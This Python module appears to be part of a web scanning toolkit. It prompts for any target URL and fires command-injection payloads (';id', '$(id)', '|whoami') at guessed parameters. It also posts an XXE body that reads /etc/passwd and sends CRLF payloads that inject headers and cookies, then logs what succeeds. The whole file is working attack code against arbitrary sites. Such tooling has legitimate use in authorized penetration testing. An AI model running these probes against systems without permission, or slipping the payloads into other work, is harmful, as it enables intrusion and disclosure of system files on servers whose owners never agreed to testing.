#!/usr/bin/env python3
"""Command injection, XXE, CRLF probes — practical, evidence-based."""
from __future__ import annotations

import re
import time
from typing import List
from urllib.parse import quote

from core_utils import (
    C, get, inject, normalize_url, params_from_url, pause,
    print_finding, save_json_report, session,
)

CMDI_PAYLOADS = [
    ";id",
    "|id",
    "||id",
    "&id",
    "&&id",
    "`id`",
    "$(id)",
    ";uname -a",
    "|whoami",
    "\nid\n",
]
CMDI_SIGS = ["uid=", "gid=", "groups=", "Linux", "Darwin", "Windows", "root:"]

XXE_BODY = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>'''
XXE_SIGS = ["root:x:", "daemon:", "[fonts]", "boot loader"]

CRLF_PAYLOADS = [
    "%0d%0aX-Injected:%20true",
    "%0aX-Injected:%20true",
    "%0d%0aSet-Cookie:%20crlfi=1",
]


def probe_cmdi(url: str) -> List[dict]:
    s = session()
    findings = []
    params = params_from_url(url) or ["cmd", "exec", "command", "q", "s", "host", "ip", "ping"]
    print(f"{C.GOLD}[*] Command injection — params={params}{C.R}")
    for param in params:
        for payload in CMDI_PAYLOADS:
            test = inject(url, param, payload) if params_from_url(url) else f"{url}?{param}={quote(payload)}"
            r = get(s, test, timeout=6)
            if not r:
                continue
            body = r.text or ""
            if any(sig in body for sig in CMDI_SIGS):
                f = {"type": "CMDi", "param": param, "payload": payload, "evidence": body[:250]}
                findings.append(f)
                print_finding("Command Injection", f"param={param} payload={payload}", body[:120], "high")
                break
    return findings


def probe_xxe(url: str) -> List[dict]:
    s = session()
    findings = []
    print(f"{C.GOLD}[*] XXE (POST XML){C.R}")
    try:
        r = s.post(url, data=XXE_BODY, headers={"Content-Type": "application/xml"},
                   timeout=8, verify=False, allow_redirects=False)
    except Exception:
        return findings
    body = r.text or ""
    if any(sig in body for sig in XXE_SIGS):
        findings.append({"type": "XXE", "evidence": body[:300]})
        print_finding("XXE", url, body[:120], "high")
    return findings


def probe_crlf(url: str) -> List[dict]:
    s = session()
    findings = []
    params = params_from_url(url) or ["url", "redirect", "next", "q"]
    print(f"{C.GOLD}[*] CRLF / header injection{C.R}")
    for param in params:
        for payload in CRLF_PAYLOADS:
            test = inject(url, param, payload) if params_from_url(url) else f"{url}?{param}={payload}"
            r = get(s, test, timeout=6)
            if not r:
                continue
            # reflected header or body marker
            joined = str(r.headers) + (r.text or "")
            if "X-Injected" in joined or "crlfi=1" in joined:
                findings.append({"type": "CRLF", "param": param, "payload": payload})
                print_finding("CRLF Injection", f"param={param}", severity="high")
                break
    return findings


def run():
    print(f"\n{C.PURP}{C.B}  Injection Pack (CMDi / XXE / CRLF){C.R}\n")
    url = normalize_url(input(f"{C.AQUA}[?] Target URL: {C.R}").strip())
    if not url:
        return
    all_f = []
    all_f += probe_cmdi(url)
    all_f += probe_xxe(url)
    all_f += probe_crlf(url)
    print(f"\n{C.NEON}[+] Findings: {len(all_f)}{C.R}")
    if all_f:
        path = save_json_report("injection_pack", {"url": url, "findings": all_f})
        print(f"{C.GREEN}[+] Saved: {path}{C.R}")
    pause()


if __name__ == "__main__":
    run()
